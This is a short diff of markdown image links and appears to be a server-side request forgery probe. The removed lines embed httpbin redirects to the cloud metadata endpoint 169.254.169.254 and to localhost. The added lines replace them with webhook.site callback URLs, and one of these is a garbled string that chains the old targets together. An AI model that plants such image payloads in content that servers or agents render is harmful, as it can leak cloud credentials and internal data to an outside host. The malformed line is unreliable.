@@ -1,3 +1,3 @@
-![p](https://httpbin.org/redirect-to?url=http%3A%2F%2F140.82.112.3.nip.io%2Fmeta&status_code=302)
-![q](https://httpbin.org/redirect-to?url=http%3A%2F%2F169.254.169.254.nip.io%2Fmetadata%2Finstance%3Fapi-version%3D2021-02-01&status_code=302)
-![r](https://httpbin.org/redirect-to?url=http%3A%2F%2F127.0.0.1.nip.io%3A8080%2F&status_code=302)
+![p](https://webhook.site/2fda2f38-51f0-4d7d-af3c-aa7c75a332a0)
+![q](https://webhook.site/->)
+![r](https://webhook.site/http://140.82.112.3.nip.io/meta 0fbf6a9f-b8b4-45c2-9fba-fa5f9017752c -> http://169.254.169.254.nip.io/metadata/instance?api-version=2021-02-01 fac0969b-7bc6-4e87-a3c0-e91d074e1044 -> http://127.0.0.1.nip.io:8080/)
